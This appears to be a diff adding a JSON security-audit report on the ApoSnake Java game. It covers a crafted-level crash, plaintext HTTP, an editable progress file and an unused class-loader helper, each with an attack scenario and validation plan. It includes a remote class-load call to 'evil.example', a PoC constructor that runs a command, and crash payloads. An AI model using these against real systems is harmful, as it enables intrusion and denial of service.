+      "attack_scenario": "1) Attacker POSTs a crafted string such as '\\uFFFF\\uFFFF' + short body to save_level.php (the upload path ApoSnakeUserlevelsLoad.save(), lines 123-137, sends whatever string it is given with no auth and no format check visible client-side). 2) A victim starts ApoSnake; the background thread started in ApoSnakePanel.loadUserlevels() (ApoSnakePanel.java:121-129) downloads the level list. 3) Victim clicks 'userlevels'; loadLevel computes width=height=65439 from chars 0xFFFF and executes new int[65439][65439] (~17 TB request) -> OutOfMemoryError before any bounds issue; alternatively '\\u0000\\u0000' gives NegativeArraySizeException (48-96=-48), and any string shorter than width*height+2 gives StringIndexOutOfBoundsException at line 196. None of these is caught around loadLevel (callers ApoSnakePanel.setPuzzleGame/ApoSnakeMenu.mouseButtonFunction have no try/catch; Errors are not caught by the catch(Exception) in loadUserlevels either), so the game action dies / the thread crashes.",
+      "reachable": true,
+      "preconditions": "Victim must have online mode enabled (ApoConstants.B_ONLINE=true by default, _from_jar_ApoSnake/org/apogames/ApoConstants.java:16) and click the 'userlevels' menu entry; the apo-games.de server must store/serve the crafted string unsanitized (cannot be verified from this repo; the client performs zero validation regardless).",
+      "severity": "low",
+      "confidence": "high",
+      "validation_plan": "Offline proof of the sink without network: instantiate ApoSnakePuzzleGame (or call loadLevel directly) with levelString \"\\u0000\\u0000\" - observe NegativeArraySizeException at ApoSnakePuzzleGame.java:190; with \"dd5\" - observe StringIndexOutOfBoundsException at line 196. Network proof: run mitmproxy/hosts-file redirect of www.apo-games.de, serve get_level.php with a body whose i%11==0 line is '\\uFFFF\\uFFFFx', launch the desktop jar (B_APPLET=false), click 'userlevels', observe OutOfMemoryError / terminated game thread.",
+      "shared_component": false
+    },
+    {
+      "id": "ApoSnake-02",
+      "title": "All game-server traffic sent over plain HTTP (level upload/download, progress sync, audio, images)",
+      "category": "insecure_transport",
+      "cwe": "CWE-319",
+      "file": "_from_jar_ApoSnake/apoSnake/ApoSnakeConstants.java",
+      "line": 10,
+      "code_excerpt": "public final static String USERLEVELS_GETPHP = \"http://www.apo-games.de/apoSnake/get_level.php\";\npublic final static String USERLEVELS_SAVEPHP = \"http://www.apo-games.de/apoSnake/save_level.php\";",
+      "entry_point": "Any on-path attacker between the player and www.apo-games.de (LAN attacker, rogue Wi-Fi AP, DNS hijack); also applies when the game runs as applet (ApoSnakeApplet.java:28 sets B_APPLET=true enabling ApoHelp.loadData/saveData against http://www.apo-games.de/apoSnake/cookies.php, ApoHelp.java:442/473, reached from ApoSnakePanel.java:82 and :111)",
+      "sink": "urlConn = url.openConnection(); printout.writeBytes(content) in ApoSnakeUserlevelsLoad.save/load (ApoSnakeUserlevelsLoad.java:123-137, 164-179); same pattern in org/apogames/help/ApoHighscore.java:81-104 (dead code in this variant) and org/apogames/sound/AudioPlayer.java:68 (audio streamed from http://www.apo-games.de/apoPongBeat...) plus ImageIO.read(new URL(pic)) at org/apogames/image/ApoImage.java:91",
+      "data_path": "Every online feature hardcodes http:// URLs: user-level download (feeds ApoSnake-01's parser), user-level upload (ApoSnakeEditor.uploadString -> ApoSnakeUserlevels.addLevel -> ApoSnakeUserlevelsLoad.save, ApoSnakeEditor.java:265-267), and applet-mode progress persistence (cookies.php). Response bodies are consumed raw: readLine() results become level strings (i%11==0), Integer.valueOf/Float.valueOf fields, and Integer.valueOf(load) progress (ApoSnakePanel.java:84). No TLS, no signature, no checksum anywhere in the download path.",
+      "attack_scenario": "An attacker on the victim's network intercepts get_level.php responses (or DNS/ARP-hijacks www.apo-games.de) and serves arbitrary level strings, star/rating counts and names; combined with ApoSnake-01 this converts a network position directly into remote crash of every player behind the attacker. The attacker can also replay/inject save_level.php submissions to pollute the shared level pool and, in applet mode, rewrite the cookies.php progress value (e.g. inflate solved count) since there is no authentication or integrity protection on either direction.",
+      "reachable": true,
+      "preconditions": "Network position on-path to the victim (or control of the actual apo-games.de server/DNS); B_ONLINE=true (default). Applet-only sinks additionally require the deprecated applet deployment.",
+      "severity": "medium",
+      "confidence": "high",
+      "validation_plan": "Run mitmproxy in transparent mode, play the game while browsing user levels, confirm plaintext requests/responses for get_level.php appear in the proxy log; then return a modified level body and observe the altered content rendered/loaded in-game. For upload tampering, drop or alter a save_level.php POST and observe 'Uploading failed'/success flip (ApoSnakeEditor.java:266-270).",
+      "shared_component": true
+    },
+    {
+      "id": "ApoSnake-03",
+      "title": "Level-unlock progress is an unprotected local int (and HTTP value in applet mode) trusted by the client",
+      "category": "client_side_trust",
+      "cwe": "CWE-602",
+      "file": "_from_jar_ApoSnake/apoSnake/game/ApoSnakePanel.java",
+      "line": 96,
+      "code_excerpt": "this.prop.readLevel(\"properties\");\nsolved = this.prop.getSolved();\n... (write side) this.prop.setSolved(this.puzzle.getSolved());\nthis.prop.writeLevel(\"properties\");",
+      "entry_point": "Local filesystem: file named 'properties' created relative to the process working directory (user.dir), read via FileInputStream in org/apogames/ApoIO.readLevel (ApoIO.java:79) and deserialized with data.readInt() in ApoSnakeLevelIO.readLevel (ApoSnakeLevelIO.java:34). In applet mode the same value comes from http://www.apo-games.de/apoSnake/cookies.php via ApoHelp.loadData (ApoSnakePanel.java:82).",
+      "sink": "solved flows into puzzle.setSolved(solved,false) (ApoSnakePanel.java:104) and then gates progression: getMaxCanChoosen() (ApoSnakePanel.java:208-210) bounds which built-in levels can be selected in ApoSnakePuzzleChooser (ApoSnakePuzzleChooser.java:129) and in ApoSnakePuzzleGame.loadLevel (line 171).",
+      "data_path": "'properties' file (4-byte big-endian int, nothing else - ApoSnakeLevelIO.writeLevel, line 28) -> ApoIO.readLevel -> ApoSnakeLevelIO.readInt -> loadPreferences -> ApoSnakePuzzleChooser.solved -> level-selection bound. No MAC/signature/hash of any kind; the corpus-typical MD5 helper exists (ApoHelp.getMd5Digest, ApoHelp.java:284) but is never called in this variant.",
+      "attack_scenario": "A player who wants to skip levels opens '<working directory>/properties' in a hex editor, changes the 4 stored bytes to 00 00 00 63 (99), restarts the game and has all 28 built-in levels unlocked. Same trick works over the wire in applet mode by answering cookies.php with an arbitrary integer. Impact is confined to single-player progression because ApoHighscore is never invoked in this variant, so nothing cheated is submitted anywhere.",
+      "reachable": true,
+      "preconditions": "Desktop mode: write access to the game's working directory (always true for the human running it; the relevant question for the research is simply that the trust anchor is client-held data). Applet mode additionally requires the legacy plugin environment.",
+      "severity": "low",
+      "confidence": "high",
+      "validation_plan": "Run the desktop jar once to create 'properties', quit, hex-edit the single int (e.g. xxd -r -p 00000063 > properties after truncating), relaunch, open level chooser and confirm access to the last level (maxCanChoosen now 99). Also verify the file contains exactly 4 bytes (od -An -tx1 properties).",
+      "shared_component": true
+    },
+    {
+      "id": "ApoSnake-04",
+      "title": "URLClassLoader-based dynamic class instantiation helper present but unwired (theoretical remote/local class loading)",
+      "category": "remote_code_loading",
+      "cwe": "CWE-494",
+      "file": "_from_jar_ApoSnake/org/apogames/help/ApoClassLoader.java",
+      "line": 69,
+      "code_excerpt": "URLClassLoader cl = new URLClassLoader( new URL[] { url } );\nc = cl.loadClass( this.getClassname() );\nreturn c.newInstance();",
+      "entry_point": "Whatever String is passed to new ApoClassLoader(path, classname): in applet mode path is used as-is as a URL (line 68), otherwise converted from a File path (line 66). If any caller ever passed a server-controlled path/classname, the bytes fetched from that location would be defined and instantiated.",
+      "sink": "cl.loadClass(...) followed by c.newInstance() at ApoClassLoader.java:73-75 - executing the loaded class' no-arg constructor with full privileges of the JVM (no SecurityManager, no package sealing, no code-signing check).",
+      "data_path": "Grep of the entire variant shows zero references to ApoClassLoader outside its own file (verified: grep -rln ApoClassLoader matches only org/apogames/help/ApoClassLoader.java). Unlike sibling variants that reportedly feed it from network data, ApoSnake never constructs one, so there is no data flow from any entry point to this sink today.",
+      "attack_scenario": "Theoretical only: were a future maintainer to call new ApoClassLoader(\"http://evil.example/\", \"Exploit\").getMyClass() with any server-influenced argument (e.g. a downloaded level metadata field), hosting a .class file whose constructor runs arbitrary code would achieve remote code execution in the game process. As shipped, no such caller exists, so an attacker gains nothing through this file alone.",
+      "reachable": false,
+      "preconditions": "Requires code changes: someone must add a call site feeding attacker-controlled path/classname. Not exploitable in the current build.",
+      "severity": "low",
+      "confidence": "high",
+      "validation_plan": "Confirm deadness: grep -rn 'ApoClassLoader' --include='*.java' . returns only its own definition (already done). To demonstrate the latent danger, compile a two-class PoC where a test harness invokes getMyClass() against a directory containing class Exploit{ public Exploit(){Runtime.getRuntime().exec(\"calc\");} } and observe execution - proving that any future call site with remote input becomes RCE.",
+      "shared_component": true
+    }
+  ],
+  "categories_checked_and_absent": [
+    "untrusted_deserialization - no java.io.ObjectInputStream anywhere in the variant (grep over all 58 files); the only binary reads are DataInputStream.writeInt/readInt of primitives (ApoIO, ApoSnakeLevelIO)",
+    "unsafe_native_call - no System.load/System.loadLibrary/JNI in any file",
+    "weak_integrity_check (active) - MD5 helper exists (ApoHelp.getMd5Digest, ApoHelp.java:284-293) but has zero callers here, and no other hash/signature protects downloads or uploads; reported as absence rather than a finding",
+    "path_traversal - the only file writes/reads use the constant name \"properties\" (ApoSnakePanel.java:96/117) resolved against user.dir; no attacker-controlled path components; ApoCopy and ApoSnakeComponent.getFileChooser are unused by game logic",
+    "credential_or_secret_exposure - no passwords, tokens, API keys or personal data are transmitted or hardcoded; highscore submission (which would carry player names) is dead code in this variant",
+    "legacy_sandbox_assumption - the JApplet entry point (ApoSnakeApplet.java:18-28) merely flips B_APPLET to switch IO between disk and HTTP; no doPrivileged blocks, no SecurityManager reliance, no assumption of signed-applet privileges"
+  ],
+  "notes": "Layout: all sources live under _from_jar_ApoSnake/, split into the game-specific apoSnake/* tree and the shared org/apogames/* framework that recurses across the corpus (hence shared_component=true for findings rooted in org/apogames). Several corpus-wide suspects exist here only as dead code: ApoHighscore (save_highscore.php/get_highscore.php endpoints in ApoConstants.java:21-25 are never referenced), ApoClassLoader (finding 04), ApoGameCounter (posts to game_counter.php, unreferenced), ApoHelp.getMd5Digest, ApoSnakeUserlevelsLoad.getNames and ApoSnakeComponent.getFileChooser. The live attack surface is exactly three things: the user-level upload/download channel (findings 01+02), the plaintext progress record (03), and applet-mode audio/image fetches. Robustness detail worth recording for cross-variant comparison: malformed numeric lines in the get_level.php response raise NumberFormatException inside ApoSnakeUserlevelsLoad.load(), but that is absorbed by catch(Exception) in ApoSnakeUserlevels.loadUserlevels (ApoSnakeUserlevels.java:32) and in ApoSnakePanel.loadPreferences (ApoSnakePanel.java:90), unlike the parse errors in finding 01 which land in unprotected UI-callstack frames. There is no evidence of client-side sanitization of uploaded levels anywhere, so if the historical apo-games.de server accepted arbitrary strings, finding 01 was remotely triggerable against every player browsing user-made levels; the server itself is out of scope of this source tree."
+}
+<<<JSON_END>>>
